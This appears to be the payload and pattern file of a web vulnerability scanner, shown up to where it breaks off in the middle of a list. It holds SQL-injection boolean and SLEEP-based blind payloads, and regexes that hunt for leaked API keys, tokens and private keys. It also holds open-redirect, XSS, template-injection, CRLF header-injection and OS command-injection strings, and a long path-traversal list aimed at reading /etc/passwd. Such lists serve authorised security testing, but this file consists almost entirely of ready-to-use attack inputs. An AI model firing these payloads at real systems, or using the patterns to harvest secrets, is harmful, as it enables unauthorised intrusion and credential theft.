SQL_ERROR=[
"SQL syntax.*MySQL", "Warning.*mysql_.*", "valid MySQL result", "MySqlClient\.",
"PostgreSQL.*ERROR", "Warning.*\Wpg_.*", "valid PostgreSQL result", "Npgsql\.",
"Driver.* SQL[\-\_\ ]*Server", "OLE DB.* SQL Server", "(\W|\A)SQL Server.*Driver",
"Warning.*mssql_.*","(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
"(?s)Exception.*\WSystem\.Data\.SqlClient\.", "(?s)Exception.*\WRoadhouse\.Cms\.",
"Microsoft Access Driver", "JET Database Engine", "Access Database Engine",
"\bORA-[0-9][0-9][0-9][0-9]", "Oracle error", "Oracle.*Driver", "Warning.*\Woci_.*", "Warning.*\Wora_.*",
"CLI Driver.*DB2", "DB2 SQL error", "\bdb2_\w+\(",
"SQLite/JDBCDriver", "SQLite.Exception", "System.Data.SQLite.SQLiteException", "Warning.*sqlite_.*", 
"Warning.*SQLite3::", "\[SQLITE_ERROR\]",
"(?i)Warning.*sybase.*", "Sybase message", "Sybase.*Server message.*"
]

SQL_INJECTION_ERROR_BASE={
"%20OR%201=1%20":"%20OR%201=0%20",
"%20OR%20x=x":"%20OR%20x=y",
"%20OR%201=1#":"%20OR%201=0#",
"%20OR%20x=x#":"%20OR%20x=y#",
"%20OR%201=1--":"%20OR%201=0--",
"%20OR%201=1":"%20OR%201=0",
"%20OR%20x=x--":"%20OR%20x=y--",
"%20OR%203409=3409%20AND%20('pytW'%20LIKE%20'pytW":"%20OR%203409=3409%20AND%20('pytW'%20LIKE%20'pytY",
"%20HAVING%201=1":"%20HAVING%201=0",
"%20HAVING%201=1#":"%20HAVING%201=0#",
"%20HAVING%201=1--%20":"%20HAVING%201=0--%20",
"%20AND%201=1%20":"%20AND%201=0%20",
"%20AND%201=1":"%20AND%201=0",
"%20AND%201=1--%20":"%20AND%201=0--%20",
"%20AND%201=1#":"%20AND%201=0#",
"%20AND%201=1%20AND%20'%'='":"%20AND%201=0%20AND%20'%'='",
"%20AND%201083=1083%20AND%20(1427=1427":"%20AND%207506=9091%20AND%20(5913=5913",
"%20AND%201083=1083%20AND%20('1427=1427":"%20AND%207506=9091%20AND%20('5913=5913",
"%20AND%207300=7300%20AND%20'pKlZ'='pKlZ":"%20AND%207300=7300%20AND%20'pKlZ'='pKlY",
"%20AND%207300=7300%20AND%20('pKlZ'='pKlZ":"%20AND%207300=7300%20AND%20('pKlZ'='pKlY",
"%20AS%20INJECTX%20WHERE%201=1%20AND%201=1":"%20AS%20INJECTX%20WHERE%201=1%20AND%201=0",
"%20AS%20INJECTX%20WHERE%201=1%20AND%201=1#":"%20AS%20INJECTX%20WHERE%201=1%20AND%201=0#",
"%20AS%20INJECTX%20WHERE%201=1%20AND%201=1--":"%20AS%20INJECTX%20WHERE%201=1%20AND%201=0--",
"%20WHERE%201=1%20AND%201=1":"%20WHERE%201=1%20AND%201=0",
"%20WHERE%201=1%20AND%201=1#":"%20WHERE%201=1%20AND%201=0#",
"%20WHERE%201=1%20AND%201=1--":"%20WHERE%201=1%20AND%201=0--",
}
SQL_INJECTION_BLIND_BASE=[
"%20AnD%20SLEEP({})",
"%20AnD%20SLEEP({})--",
"%20AnD%20SLEEP({})#",
"&&SLEEP({})",
"&&SLEEP({})--",
"&&SLEEP({})#",
"'%20AnD%20SLEEP({})%20ANd%20'1",
"'&&SLEEP({})&&'1",
"%20ORDER%20BY%20SLEEP({})",
"%20ORDER%20BY%20SLEEP({})--",
"%20ORDER%20BY%20SLEEP({})#",
"(SELECT%20*%20FROM%20(SELECT(SLEEP({})))ecMj)",
"(SELECT%20*%20FROM%20(SELECT(SLEEP({})))ecMj)#",
"(SELECT%20*%20FROM%20(SELECT(SLEEP({})))ecMj)--",
"+%20SLEEP({})%20+%20'",
"%20SLEEP({})/*",
"%20SLEEP({})",
'%20or%20SLEEP({})',
'''"or%20SLEEP({})%20or%20"*/''',
 '%2b(select*from(select(sleep({})))a)%2b'
]
REGEX_URL = {
"slack_token": "(xox[p|b|o|a]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})",
"slack_webhook": "https://hooks.slack.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}",
"facebook_oauth": "[f|F][a|A][c|C][e|E][b|B][o|O][o|O][k|K].{0,30}['\"\\s][0-9a-f]{32}['\"\\s]",
"twitter_oauth": "[t|T][w|W][i|I][t|T][t|T][e|E][r|R].{0,30}['\"\\s][0-9a-zA-Z]{35,44}['\"\\s]",
"heroku_api": "[h|H][e|E][r|R][o|O][k|K][u|U].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}",
"mailgun_api": "key-[0-9a-zA-Z]{32}",
"mailchamp_api": "[0-9a-f]{32}-us[0-9]{1,2}",
"picatic_api": "sk_live_[0-9a-z]{32}",
"google_oauth_id": "[0-9(+-[0-9A-Za-z_]{32}.apps.googleusercontent.com",
"google_api": "AIza[0-9A-Za-z-_]{35}",
"google_captcha": "\6L[0-9A-Za-z-_]{38}$",
"google_oauth": "ya29\\.[0-9A-Za-z\\-_]+",
"amazon_aws_access_key_id": "AKIA[0-9A-Z]{16}",
"amazon_mws_auth_token": "amzn\\.mws\\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
"amazonaws_url": "s3\\.amazonaws.com[/]+|[a-zA-Z0-9_-]*\\.s3\\.amazonaws.com",
"facebook_access_token": "EAACEdEose0cBA[0-9A-Za-z]+",
"mailgun_api_key": "key-[0-9a-zA-Z]{32}",
"twilio_api_key": "\SK[0-9a-fA-F]{32}$",
"twilio_account_sid": "\AC[a-zA-Z0-9_\\-]{32}$",
"twilio_app_sid": "\AP[a-zA-Z0-9_\\-]{32}$",
"paypal_braintree_access_token": "access_token\\$production\\$[0-9a-z]{16}\\$[0-9a-f]{32}",
"square_oauth_secret": "sq0csp-[ 0-9A-Za-z\\-_]{43}",
"square_access_token": "sqOatp-[0-9A-Za-z\\-_]{22}",
"stripe_standard_api": "sk_live_[0-9a-zA-Z]{24}",
"stripe_restricted_api": "rk_live_[0-9a-zA-Z]{24}",
"github_access_token": "[a-zA-Z0-9_-]*:[a-zA-Z0-9_\\-]+@github\\.com*",
"AMAZON_URL":"amazonaws.com",
"AMAZON-S3":"//s3-",
"AMAZON_S3":"s3://",
"AMAZON":"amazonaws",
"AMAZON_KEY":"([^A-Z0-9]|^)(AKIA|A3T|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{12,}",
"Authorization":"Bearer",
"accessToken":"acesstoken=",
"vtex-key":"vtex-api",
"appkey":"appkey=",
"txt":"\.txt$",
"apptoken":"apptoken=",
".save":"\.save$",
".swp":"\.swp$",
".swo":"\.swo$",
".bak":"\.bak$",
"_bak":"_bak$",
"-bak":"-bak$",
".bk":"\.bk$",
".bkp":"\.bkp$",
".bac":"\.bac$",
".old":"\.old$",
"_old":"_old$",
"copy":"\.copy$",
".original":"\.original$",
".orig":"\.orig$",
".default":"\.default$",
".tpl":"\.tpl$",
".sql":"\.sql$",
".tmp":"\.tmp$",
".temp":"\.temp$",
".swp":"\.swp$",
".swo":"\.swo$",
".sav":"\.sav$",
".conf":"\.conf$",
".bakup":"\.bakup$",
".nsx":"\.nsx$",
".inc":"\.inc$",
".arc":"\.arc$",
".lst":"\.lst$",
".sql\.gz":"\.sql\.gz$",
".bak\.sql":"\.bak\.sql$",
".bak\.sql\.gz":"\.bak\.sql\.gz$",
".bak\.sql\.bz2":"\.bak\.sql\.bz2$",
".bak\.sql\.tar\.gz":"\.bak\.sql\.tar\.gz$",
".git":"\.git$",
".svn":"\.svn$",
".bzr":"\.bzr$",
"wc\.db":"wc\.db$",
".db":"\.db$",
".DS_Store":"\.DS_Store",
"composer\.lock":"composer\.lock",
".git/config":"/.git/config",
".svn/entries":"/\.svn/entries",
"app/kibana":"app/kibana",
"scopia/entry/index.jsp":"/scopia/entry/index.jsp",
"_cpanel/forgotpwd":"_cpanel/forgotpwd",
"portal/apis/fileExplore":"/portal/apis/fileExplorer",
"dana-na":"/dana-na",
"htdocs":"/htdocs",
"phpmyadmin":"/phpmyadmin" }
REGEX_JS = {
"slack_token": "(xox[p|b|o|a]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})",
"slack_webhook": "https://hooks.slack.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}",
"facebook_oauth": "[f|F][a|A][c|C][e|E][b|B][o|O][o|O][k|K].{0,30}['\"\\s][0-9a-f]{32}['\"\\s]",
"twitter_oauth": "[t|T][w|W][i|I][t|T][t|T][e|E][r|R].{0,30}['\"\\s][0-9a-zA-Z]{35,44}['\"\\s]",
"heroku_api": "[h|H][e|E][r|R][o|O][k|K][u|U].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}",
"mailgun_api": "key-[0-9a-zA-Z]{32}",
"mailchamp_api": "[0-9a-f]{32}-us[0-9]{1,2}",
"picatic_api": "sk_live_[0-9a-z]{32}",
"google_oauth_id": "[0-9(+-[0-9A-Za-z_]{32}.apps.googleusercontent.com",
"google_api": "AIza[0-9A-Za-z-_]{35}",
"google_captcha": "\6L[0-9A-Za-z-_]{38}$",
"google_oauth": "ya29\\.[0-9A-Za-z\\-_]+",
"amazon_aws_access_key_id": "AKIA[0-9A-Z]{16}",
"amazon_mws_auth_token": "amzn\\.mws\\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
"amazonaws_url": "s3\\.amazonaws.com[/]+|[a-zA-Z0-9_-]*\\.s3\\.amazonaws.com",
"facebook_access_token": "EAACEdEose0cBA[0-9A-Za-z]+",
"mailgun_api_key": "key-[0-9a-zA-Z]{32}",
"twilio_api_key": "\SK[0-9a-fA-F]{32}$",
"twilio_account_sid": "\AC[a-zA-Z0-9_\\-]{32}$",
"twilio_app_sid": "\AP[a-zA-Z0-9_\\-]{32}$",
"paypal_braintree_access_token": "access_token\\$production\\$[0-9a-z]{16}\\$[0-9a-f]{32}",
"square_oauth_secret": "sq0csp-[ 0-9A-Za-z\\-_]{43}",
"square_access_token": "sqOatp-[0-9A-Za-z\\-_]{22}",
"stripe_standard_api": "sk_live_[0-9a-zA-Z]{24}",
"stripe_restricted_api": "rk_live_[0-9a-zA-Z]{24}",
"github_access_token": "[a-zA-Z0-9_-]*:[a-zA-Z0-9_\\-]+@github\\.com*",
"private_ssh_key": "-----BEGIN PRIVATE KEY-----[a-zA-Z0-9\\S]{100,}-----END PRIVATE KEY-----",
"private_rsa_key": "-----BEGIN RSA PRIVATE KEY-----[a-zA-Z0-9\\S]{100,}-----END RSA PRIVATE KEY-----",
"AMAZON_URL_1":"[a-z0-9.-].amazonaws.com",
"AMAZON_URL_2":"[a-z0-9.-].s3-[a-z0-9.-][.-](eu|ap|us|ca|sa|cn)",
"AMAZON_URL_3":"s3.amazonaws.com/[a-z0-9._-]",
"AMAZON_URL_4":"s3-[a-z0-9-].amazonaws.com/[a-z0-9._-]",
#"URL":"https?://[^\"\\'> ]+",
"AMAZON_KEY":"([^A-Z0-9]|^)(AKIA|A3T|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{12,}",
"Authorization":"^Bearer\s[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$",
"accessToken":"^acesstoken=[0-9]{13,17}",
"vtex-key":"vtex-api-(appkey|apptoken)",
"email":"(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$)"  
}
payloads_OR_p=['//google.com/%2f..','///google.com/%2f..','////google.com/%2f..','https://google.com/%2f..','/https://google.com/%2f..','//www.google.com/%2f%2e%2e',
'www.google.com','///www.google.com/%2f%2e%2e','////www.google.com/%2f%2e%2e','https://www.google.com/%2f%2e%2e','/https://www.google.com/%2f%2e%2e','//google.com/',
'////google.com/','https://google.com/','/https://google.com/','//google.com//','//%09/google.com','///%09/google.com','////%09/google.com','/%5cgoogle.com',
'//google%E3%80%82com','\/\/google.com/','/\/google.com/','//google%00.com','aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ==','http:[::216.58.214.206]','google.com','ｰgoogle.com',
'google.com','https://www.google.com','http://www.google.com'
]
payloads_OR_d=['google.com/%2f..','https://google.com/%2f..','www.google.com/%2f%2e%2e',
'www.google.com','www.google.com/%2f%2e%2e','https://www.google.com/%2f%2e%2e','google.com/',
'https://google.com/','%09/google.com''/%5cgoogle.com',
'google%E3%80%82com','google%00.com','aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ==','http:[::216.58.214.206]','〱google.com','ｰgoogle.com',
'google.com','http://www.google.com'
]
parameters_OR=[
'dest','redirect','uri','path','continue','url','window','data','next','reference','site','html','val',
'validate','domain','callback','return','page','view','dir','show','file','document','folder','root',
'path','pg','style','pdf','template','php_path','doc','feed','host','port','to','out','navigation','open','result'
] 
XSS={'a<T"rSAF45>':'a%3CT%22rSAF45%3E','a<T"rSAF45':'a%3CT%22rSAF45','TrS"AF45<':'TrS%22AF45%3C','<TrSA"AF45':'<TrSA"AF45',
'TrSAAFF"45<':'TrSAAFF"45<','TrSAA"F45<':'TrSAA%22F45%3C','TrSA"AF45>':'TrSA"AF45>','Tr"SA<F45':'Tr%22SA%3CF45',
'TrSA>F"45':'TrSA%3EF%2245','TrSA<AF4"5':'TrSA<AF4"5','T"rSA>AF45':'T"rSA>AF45'}
payload_ssti_1=["%7B%7B88*668%7D%7D","{{88*668}}","%3C%25%3D%2088%20%2a%20668%20%25%3E","<%=88*668%>",
"%23%7B%2088%20%2a%20668%20%7D","#{88*668}","%24%7B88%2a668%7D","${88*668}","%24%7B%7B88%2a668%7D%7D","${{88*668}}",
"%23%7B88%2a668%7D","%23%7B%7B88%2a668%7D%7D","#{{88*668}}"]
payload_ssti_2=["%7B%7B95*338%7D%7D","{{95*338}}","%3C%25%3D%2095%20%2a%20338%20%25%3E","<%=95*338%>",
"%23%7B%2095%20%2a%20338%20%7D","#{95*338}","%24%7B95%2a338%7D","${95*338}","%24%7B%7B95%2a338%7D%7D","${{95*338}}",
"%23%7B95%2a338%7D","%23%7B%7B95%2a338%7D%7D","#{{95*338}}"]

payload_crlf=["%%0a0aSet-Cookie:crlf=injection",
"%0aSet-Cookie:crlf=injection","%0d%0aSet-Cookie:crlf=injection",
"%0dSet-Cookie:crlf=injection","%23%0aSet-Cookie:crlf=injection","%23%0d%0aSet-Cookie:crlf=injection",
"%23%0dSet-Cookie:crlf=injection","%25%30%61Set-Cookie:crlf=injection","%25%30aSet-Cookie:crlf=injection",
"%250aSet-Cookie:crlf=injection","%25250aSet-Cookie:crlf=injection","%2e%2e%2f%0d%0aSet-Cookie:crlf=injection",
"%2f%2e%2e%0d%0aSet-Cookie:crlf=injection","%2F..%0d%0aSet-Cookie:crlf=injection","%3f%0d%0aSet-Cookie:crlf=injection",
"%3f%0dSet-Cookie:crlf=injection","%u000aSet-Cookie:crlf=injection"]

OScommand=['& id', '&& id', '|| id', '&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;',
'&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;', '/index.html|id|', 'id', ';id;', 
';id', ';id;', '|id', '|/usr/bin/id', '|id|', '|/usr/bin/id|', '||/usr/bin/id|', 
'|id;', '||/usr/bin/id;', ';id|', ';|/usr/bin/id|', '\\n/usr/bin/id\\n', '\\nid\\n',
'\\n/usr/bin/id;', '\\nid;', '\\n/usr/bin/id|', '\\nid|', ';/usr/bin/id\\n', ';id\\n',
'|usr/bin/id\\n', '|nid\\n', '`id`', '`/usr/bin/id`', 'a);id', 'a;id', 'a);id;', 'a;id;',
'a);id|', 'a;id|', 'a)|id', 'a|id', 'a)|id;', 'a|id', 'a);/usr/bin/id',"i'd'","a|i'd'","a||i'd'","&i'd'","&&i'd'", 'a;/usr/bin/id', 
'a);/usr/bin/id;', 'a;/usr/bin/id;','X&cmd=id','X&command=id'
]
LFI=['%00../../../../../../etc/passwd', '%00/etc/passwd%00', '%0a/bin/cat%20/etc/passwd',
'/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd', 
'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', 
'..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd', '\\\\&apos;/bin/cat%20/etc/passwd\\\\&apos;', 
'/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd', 
'/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd', 
'/etc/default/passwd', '/etc/master.passwd', '/./././././././././././etc/passwd', 
'/../../../../../../../../../../etc/passwd', '/../../../../../../../../../../etc/passwd^^', 
'/..\\../..\\../..\\../..\\../..\\../..\\../etc/passwd', '/etc/passwd', 
'../../../../../../../../../../../../../../../../../../../../../../etc/passwd', 
'../../../../../../../../../../../../../../../../../../../../../etc/passwd', 
'../../../../../../../../../../../../../../../../../../../../etc/passwd', 
'../../../../../../../../../../../../../../../../../../../etc/passwd', 
'../../../../../../../../../../../../../../../../../../etc/passwd', 
'../../../../../../../../../../../../../../../../../etc/passwd', 
'../../../../../../../../../../../../../../../../etc/passwd', 
'../../../../../../../../../../../../../../../etc/passwd', 
'../../../../../../../../../../../../../../etc/passwd', 
'../../../../../../../../../../../../../etc/passwd', 
'../../../../../../../../../../../../etc/passwd', 
'../../../../../../../../../../../etc/passwd', 
'../../../../../../../../../../etc/passwd', 
'../../../../../../../../../etc/passwd', 
'../../../../../../../../etc/passwd', 
'../../../../../../../etc/passwd', 
'../../../../../../etc/passwd', 
'../../../../../etc/passwd', '../../../../etc/passwd', 
'../../../etc/passwd', '../../etc/passwd', 
'../etc/passwd', '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd', 
'.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd', 
'\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd', 
'etc/passwd', '/etc/passwd%00', '../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00', '../../../../../../../../../../../../../../../../../../../../../etc/passwd%00', '../../../../../../../../../../../../../../../../../../../../etc/passwd%00', 
'../../../../../../../../../../../../../../../../../../../etc/passwd%00', 
'../../../../../../../../../../../../../../../../../../etc/passwd%00', 
'../../../../../../../../../../../../../../../../../etc/passwd%00', 
'../../../../../../../../../../../../../../../../etc/passwd%00', 
'../../../../../../../../../../../../../../../etc/passwd%00', 
'../../../../../../../../../../../../../../etc/passwd%00', 
'../../../../../../../../../../../../../etc/passwd%00', 
'../../../../../../../../../../../../etc/passwd%00', 
'../../../../../../../../../../../etc/passwd%00', 
'../../../../../../../../../../etc/passwd%00', 
'../../../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00', 
'../../../../../../../etc/passwd%00', '../../../../../../etc/passwd%00', 
'../../../../../etc/passwd%00', '../../../../etc/passwd%00', '../../../etc/passwd%00', 
'../../etc/passwd%00', '../etc/passwd%00', 
'..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00', 
'\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00', 
'/../../../../../../../../../../../etc/passwd%00.html', 
'/../../../../../../../../../../../etc/passwd%00.jpg', 
'../../../../../../etc/passwd&=%3C%3C%3C%3C', '..2fetc2fpasswd', 
'..2fetc2fpasswd%00', '..2f..2fetc2fpasswd', '..2f..2fetc2fpasswd%00', 
'..2f..2f..2fetc2fpasswd', '..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2fetc2fpasswd', 
'..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2fetc2fpasswd', 
'..2f..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2f..2fetc2fpasswd', 
'..2f..2f..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', 
'..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', '..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', 
'..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd', 
'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00',
'L2V0Yy9tYXN0ZXIucGFzc3dk',
'L21hc3Rlci5wYXNzd2Q=',
'ZXRjL3Bhc3N3ZA==',
'ZXRjL3NoYWRvdyUwMA==',
'L2V0Yy9wYXNzd2Q=',
'L2V0Yy9wYXNzd2QlMDA=',
'Li4vZXRjL3Bhc3N3ZA==',
'Li4vZXRjL3Bhc3N3ZCUwMA==',
'Li4vLi4vZXRjL3Bhc3N3ZA==',
'Li4vLi4vZXRjL3Bhc3N3ZCUwMA==',
'Li4vLi4vLi4vZXRjL3Bhc3N3ZA==',
'Li4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==', 'Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==', 
'Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==', 
'Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==', 'Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==', 
'Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==', 
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==', 
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==', 
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==', 
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==', 
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==', 
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==', 
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==', 
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==', 
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==',
